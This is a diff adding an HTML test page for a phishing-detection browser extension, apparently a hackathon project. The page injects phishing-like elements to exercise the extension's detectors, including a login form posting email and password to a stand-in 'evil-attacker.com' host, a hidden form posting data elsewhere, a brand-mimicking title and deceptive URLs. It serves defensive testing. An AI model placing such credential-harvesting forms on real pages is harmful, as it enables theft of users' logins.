@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PhishGuard AI — Test Suite</title>
+  <style>
+    :root {
+      --bg: #0b0f19;
+      --card-bg: #111827;
+      --card-hi: #1f2937;
+      --cyan: #00f0ff;
+      --purple: #7b2ff7;
+      --red: #ff3b5c;
+      --green: #22d67e;
+      --amber: #f5a623;
+      --text: #f3f4f6;
+      --text-dim: #9ca3af;
+      --radius: 12px;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      margin: 0;
+      padding: 40px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      font-weight: 800;
+      margin: 0 0 10px;
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: -1px;
+    }
+
+    .subtitle {
+      color: var(--text-dim);
+      font-size: 1.1rem;
+    }
+
+    .section {
+      background: var(--card-bg);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: var(--radius);
+      padding: 30px;
+      margin-bottom: 30px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+    }
+
+    h2 {
+      font-size: 1.5rem;
+      color: var(--cyan);
+      margin-top: 0;
+      margin-bottom: 20px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 10px;
+    }
+
+    p {
+      line-height: 1.6;
+      color: var(--text-dim);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 20px;
+    }
+
+    .test-card {
+      background: var(--card-hi);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      transition: transform 0.2s, border-color 0.2s;
+    }
+
+    .test-card:hover {
+      transform: translateY(-2px);
+      border-color: rgba(0, 240, 255, 0.3);
+    }
+
+    .test-title {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+
+    .test-desc {
+      font-size: 0.85rem;
+      color: var(--text-dim);
+      margin-bottom: 20px;
+      flex-grow: 1;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      color: #fff;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: opacity 0.2s, transform 0.1s;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+    }
+
+    .btn:active {
+      transform: scale(0.98);
+    }
+
+    .btn-secondary {
+      background: #374151;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .btn-secondary:hover {
+      background: #4b5563;
+    }
+
+    .warning-box {
+      background: rgba(255, 59, 92, 0.1);
+      border-left: 4px solid var(--red);
+      color: var(--red);
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .success-box {
+      background: rgba(34, 214, 126, 0.1);
+      border-left: 4px solid var(--green);
+      color: var(--green);
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+    }
+
+    .footer {
+      text-align: center;
+      color: var(--text-muted);
+      font-size: 0.8rem;
+      margin-top: 50px;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      padding-top: 20px;
+      width: 100%;
+    }
+
+    /* Container for forms used for triggering detection */
+    .trigger-sandbox {
+      border: 1px dashed rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    .input-group {
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .input-group label {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      margin-bottom: 4px;
+    }
+
+    .input-group input {
+      background: #1f2937;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: #fff;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 0.9rem;
+    }
+
+    /* Styles specifically to trigger content script hidden elements check */
+    .hidden-form-trigger {
+      display: none;
+    }
+
+    .hidden-iframe-trigger {
+      width: 0px;
+      height: 0px;
+      border: 0;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <header>
+      <h1>PhishGuard AI — Local Testing Lab</h1>
+      <p class="subtitle">Diagnostic panel to verify extension warning overlays and heuristic flags</p>
+    </header>
+
+    <div class="success-box">
+      <strong>How to test:</strong> Load this directory unpacked in Chrome (<code>chrome://extensions</code>), open this page, and click the trigger buttons below to test content-script alerts.
+    </div>
+
+    <!-- SECTION 1: CONTENT SCRIPT TRIGGERS -->
+    <div class="section">
+      <h2>1. DOM Heuristics (Content Script)</h2>
+      <p>These buttons dynamically inject elements or alter page parameters to trigger <code>content.js</code> scanning. Once triggered, open the PhishGuard extension popup to see the threat listing or watch for warning overlays.</p>
+
+      <div class="grid">
+        <!-- Test 1: Mimic Brand Title -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Brand Mimicking Title</div>
+            <div class="test-desc">Changes the page title to "PayPal - Login Panel" to trigger brand imitation alerts (since the hostname isn't paypal.com).</div>
+          </div>
+          <button class="btn" id="btnTitleTrigger">Mimic PayPal Title</button>
+        </div>
+
+        <!-- Test 2: External Form Submission -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">External Action Login Form</div>
+            <div class="test-desc">Injects a login form that sends credentials to an external attacker domain (<code>http://evil-attacker.com/steal</code>).</div>
+          </div>
+          <button class="btn" id="btnFormTrigger">Inject Login Form</button>
+        </div>
+
+        <!-- Test 3: Password Autocomplete Off -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Autocomplete Disabled</div>
+            <div class="test-desc">Injects a password input with <code>autocomplete="off"</code>, a technique often used in phishing templates.</div>
+          </div>
+          <button class="btn" id="btnAutocompleteTrigger">Inject Password Input</button>
+        </div>
+
+        <!-- Test 4: Hidden Form Detector -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Hidden Form Detection</div>
+            <div class="test-desc">Injects a hidden form in the background, commonly used by credential harvesters to steal tokens.</div>
+          </div>
+          <button class="btn" id="btnHiddenFormTrigger">Inject Hidden Form</button>
+        </div>
+      </div>
+
+      <!-- Sandbox area for injected elements -->
+      <div id="sandbox" class="trigger-sandbox" style="display: none;">
+        <strong>Live Sandbox:</strong>
+        <div id="sandbox-content"></div>
+      </div>
+    </div>
+
+    <!-- SECTION 2: URL TRIGGERS -->
+    <div class="section">
+      <h2>2. URL-based Threat Indicators</h2>
+      <p>The background worker scans hostnames for structures associated with phishing campaigns. You can test these by typing a suspicious URL into the extension's manual scanner, or clicking these links:</p>
+
+      <div class="grid">
+        <!-- Test 5: Suspicious TLD -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Suspicious TLD Link</div>
+            <div class="test-desc">A link pointing to a dot-xyz domain, which is flagged as a suspicious TLD.</div>
+          </div>
+          <a href="http://phishguard-test-site.xyz" target="_blank" class="btn btn-secondary">Go to .xyz Site</a>
+        </div>
+
+        <!-- Test 6: Keyword Accumulation -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Keyword Aggregation Link</div>
+            <div class="test-desc">A link containing multiple phishing-related keywords (login, verify, secure, banking).</div>
+          </div>
+          <a href="http://secure-banking-login-verify.com" target="_blank" class="btn btn-secondary">Go to Keyword Site</a>
+        </div>
+
+        <!-- Test 7: Homograph IDN Attack -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">Homograph/IDN Attack</div>
+            <div class="test-desc">Uses non-ASCII characters that look exactly like standard ones to mimic famous brand domains.</div>
+          </div>
+          <a href="http://xn--gogle-qqa.com" target="_blank" class="btn btn-secondary">Go to IDN Site</a>
+        </div>
+
+        <!-- Test 8: IP-based Hostname -->
+        <div class="test-card">
+          <div>
+            <div class="test-title">IP Address Hostname</div>
+            <div class="test-desc">A URL using a raw IP address instead of a domain name, triggering a high risk factor.</div>
+          </div>
+          <a href="http://192.168.1.100/login.html" target="_blank" class="btn btn-secondary">Go to IP Site</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      PhishGuard AI Diagnostic Lab · Smart India Hackathon
+    </div>
+  </div>
+
+  <script>
+    const sandbox = document.getElementById('sandbox');
+    const sandboxContent = document.getElementById('sandbox-content');
+
+    // Title mimic trigger
+    document.getElementById('btnTitleTrigger').addEventListener('click', () => {
+      document.title = "PayPal - Secure Login Panel";
+      alert("Page title updated to 'PayPal - Secure Login Panel'. This will trigger brand mimicking alerts since this domain is not paypal.com. Press 'Scan Site' in the extension popup!");
+    });
+
+    // Form inject trigger
+    document.getElementById('btnFormTrigger').addEventListener('click', () => {
+      sandbox.style.display = 'block';
+      sandboxContent.innerHTML = `
+        <form action="http://evil-attacker.com/steal-credentials" method="POST" style="margin-top: 15px;">
+          <p style="color: var(--cyan); margin: 0 0 10px; font-size: 0.9rem;">Form submitting to external domain:</p>
+          <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" name="user_email" placeholder="email@example.com">
+          </div>
+          <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="user_pass" placeholder="••••••••">
+          </div>
+          <button type="submit" class="btn" style="padding: 6px 12px; font-size: 0.8rem;" onclick="event.preventDefault(); alert('Submitting prevented for safety.');">Submit Credentials</button>
+        </form>
+      `;
+      alert("Injected a login form pointing to evil-attacker.com. Run the content detection scanner by checking the extension popup or refreshing.");
+    });
+
+    // Autocomplete trigger
+    document.getElementById('btnAutocompleteTrigger').addEventListener('click', () => {
+      sandbox.style.display = 'block';
+      sandboxContent.innerHTML = `
+        <div style="margin-top: 15px;">
+          <p style="color: var(--cyan); margin: 0 0 10px; font-size: 0.9rem;">Password Input with Autocomplete Off:</p>
+          <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="user_pass" autocomplete="off" placeholder="••••••••">
+          </div>
+        </div>
+      `;
+      alert("Injected password input with autocomplete='off'.");
+    });
+
+    // Hidden form trigger
+    document.getElementById('btnHiddenFormTrigger').addEventListener('click', () => {
+      sandbox.style.display = 'block';
+      sandboxContent.innerHTML = `
+        <div style="margin-top: 15px;">
+          <p style="color: var(--cyan); margin: 0 0 10px; font-size: 0.9rem;">Hidden Form (Injected behind the scenes):</p>
+          <form class="hidden-form-trigger" action="http://hidden-submission.com" method="POST">
+            <input type="text" name="hidden_data">
+          </form>
+          <p style="font-size: 0.8rem; font-style: italic;">A form with display: none has been injected into the DOM.</p>
+        </div>
+      `;
+      alert("Injected hidden form into the DOM.");
+    });
+  </script>
+</body>
+</html>
